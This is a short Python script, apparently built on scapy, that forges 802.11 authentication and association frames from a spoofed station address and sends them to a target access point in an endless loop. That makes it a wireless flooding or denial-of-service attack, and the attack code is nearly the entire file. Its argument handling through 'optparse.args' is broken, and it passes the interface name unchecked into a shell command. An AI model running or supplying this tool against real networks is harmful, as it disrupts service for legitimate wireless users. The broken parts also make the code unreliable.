from scapy.all import *
import optparse
import os

ap = optparse.args.ap
sta = optparse.args.sta
ssid = optparse.args.ssid
ch = optparse.args.ch
iface = optparse.args.iface
 
ALGO_OPEN_AUTH = 0  # OPN
START_SEQNUM = 1  # sequence number

def auth_attack():
    # Authentication
    frame1 = RadioTap()\
        /Dot11(type=0, subtype=11, addr1=ap, addr2=sta, addr3=ap)\
        /Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM)
 
    # Association
    frame2 = RadioTap()\
        /Dot11(type=0, subtype=0, addr1=ap, addr2=sta, addr3=ap)\
        /Dot11AssoReq()\
        /Dot11Elt(ID='SSID', info=ssid)

    while True:
        sendp(frame1, iface=iface)
        sendp(frame2, iface=iface)

def channel_switch(iface,ch):
    os.system('iwconfig ' + iface + ' channel ' + str(ch))

if __name__=='__main__':
    channel_switch(iface, ch)
    auth_attack()

